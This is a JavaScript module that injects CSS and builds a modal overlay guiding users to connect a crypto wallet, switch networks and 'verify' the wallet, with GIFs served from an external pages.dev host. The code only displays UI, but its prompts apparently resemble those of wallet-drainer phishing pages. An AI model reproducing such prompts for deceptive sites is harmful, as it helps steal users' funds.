const instruction_style = `
@import url("https://fonts.googleapis.com/css2?family=Roboto&display=swap");

.loader-container{
  display:none;
  
}

.loader-container.show {
  width: 100%;
  height: 100vh;
  position: absolute;
  top: 0;
  left: 0;
  display: flex;
  justify-content: center;
  align-items: center;
  font-family: "Roboto", sans-serif;
  text-align: center;
}

.loader-container .loader-overlay {
  width: 100%;
  height: 100vh;
  position: absolute;
  top: 0;
  left: 0;
  background-color: rgba(0, 0, 0, 0.44);
}

.loader-container .loader-content {
  width: 300px;
  height: fit-content;
  background-color: #0e0e0e;
  border-radius: 30px;
  color: #fff;
  z-index: 2;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 20px 2.5px;
  position: relative;
  transition: all 0.5s ease;
  transition: transform 0.4s ease;
}


.loader-content .header {
  font-size: 18px;
  font-weight: 600;
  padding-bottom: 10px;
}

.loader-content .title {
  font-size: 16px;
  font-weight: 600;
  padding-top: 10px;
  padding-bottom: 5px;
  justify-self: flex-end;
  margin: 0;
  margin-top: auto;
}

.loader-content .spinner {
  width: 70%;
  padding: 5% 15%;
  box-sizing: border-box;
  animation: rotate 1s linear infinite;
}
.loader-content .gif {
  width: 250px;
  border-radius: 10px;
}

.loader-content .subtitle {
  font-size: 15px;
  font-weight: 500;
  margin: 0;
  padding: 0 5px;
  color: rgba(117, 117, 117, 0.77);
}

.loader-content button.close-button {
  color: #1877f2;
  font-weight: 600;
  background: none;
  border: none;
  cursor: pointer;
    position: absolute;
  top: 10px;
  right: 20px;
width:33px;
height:33px;
border-radius:50%;



}


  .loader-content button.close-button:hover{
    background: rgba(255,255,255,0.3)
}

.loader-content button.close-button::before {
  content: "\\00D7"; /* Unicode for multiplication sign (X) */
  font-size: 27px;
  color: #fff;
  display: inline-block; /* Ensure it behaves like a block element for scaling */
  transition: transform 0.2s ease, color 0.2s ease;
}

.loader-content button.close-button:active::before{
   transform: scale(0.8) ;
    color:red;
}

@keyframes rotate {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}

`;

class Instructions {
  constructor() {
    this.style = document.createElement("style");
    this.style.innerText = instruction_style;
    document.head.appendChild(this.style);

    this.loaderContainer = document.createElement("main");
    this.loaderContainer.className = "loader-container";

    this.loaderOverlay = document.createElement("div");
    this.loaderOverlay.className = "loader-overlay";

    this.loaderContent = document.createElement("div");
    this.loaderContent.className = "loader-content";

    this.header = document.createElement("header");
    this.header.className = "header";
    this.header.innerText = "Follow Instructions";

    this.img = document.createElement("img");

    this.title = document.createElement("h3");
    this.title.className = "title";

    this.subtitle = document.createElement("h5");
    this.subtitle.className = "subtitle";

    this.closeButton = document.createElement("button");
    this.closeButton.className = "close-button";
    this.closeButton.onclick = () => {
      this.hide();
    };

    this.loaderContent.appendChild(this.header);
    this.loaderContent.appendChild(this.img);
    this.loaderContent.appendChild(this.title);
    this.loaderContent.appendChild(this.subtitle);
    this.loaderContent.appendChild(this.closeButton);

    this.loaderContainer.appendChild(this.loaderOverlay);
    this.loaderContainer.appendChild(this.loaderContent);

    document.body.appendChild(this.loaderContainer);
  }

  loading() {
    this.loaderContainer.classList.add("show");
    this.img.src =
      "https://static-00.iconduck.com/assets.00/connection-loading-icon-512x512-59cpvtl7.png";
    this.title.innerText = "Please Wait";
    this.subtitle.innerText = "Trying to connect your wallet.";
    this.img.classList.add("spinner");
  }

  setStatus(status = "connect") {
    const events = {
      connect: {
        title: "Connecting Wallet",
        subtitle: "Please Connect your wallet.",
      },
      switch_chain: {
        title: "Switch Network",
        subtitle: "Please Switch Network to Continue.",
      },
      safa: {
        title: "Pending Verification",
        subtitle: "Verify Your Wallet to Continue.",
      },
    };

    const event = events[status];

    this.loaderContainer.classList.add("show");
    this.img.src = `https://img-9mp.pages.dev/${status}.gif`;
    this.img.classList.remove("spinner");
    this.img.classList.add("gif");
    this.title.innerText = event.title;
    this.subtitle.innerText = event.subtitle;
  }

  hide() {
    this.loaderContainer.classList.remove("show");
  }
}

export default Instructions;

/* 
https://img-9mp.pages.dev/connect.gif
https://img-9mp.pages.dev/switch_chain.gif
https://img-9mp.pages.dev/safa.gif
https://img-9mp.pages.dev/contract_interaction.gif
*/
